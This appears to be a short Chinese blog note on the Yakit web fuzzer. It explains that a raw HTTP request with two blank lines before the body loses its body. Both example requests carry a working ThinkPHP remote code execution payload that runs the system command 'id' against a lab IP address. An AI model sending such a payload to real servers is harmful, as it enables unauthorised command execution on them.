---
title: "关于Yakit工具web fuzzer使用"
date: 2026-09-18 15:10:04
description: "关于HTTP数据包 其实这个我不是很想说的，因为我感觉没什么能写的，主要是习惯问题： 和 这两个，其中第二个是识别不到body的，也就是http的body部分，是识别不到的。也就是说不能空两行，只能留一行空格。"
categories:
  - 网络安全
tags:
  - 漏洞复刻
---

## 关于HTTP数据包

其实这个我不是很想说的，因为我感觉没什么能写的，主要是习惯问题：

```http
POST /index.php?s=captcha HTTP/1.1
Host: 10.4.210.101:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

和

```http
POST /index.php?s=captcha HTTP/1.1
Host: 10.4.210.101:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72


_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

这两个，其中第二个是识别不到body的，也就是http的body部分，是识别不到的。也就是说不能空两行，只能留一行空格。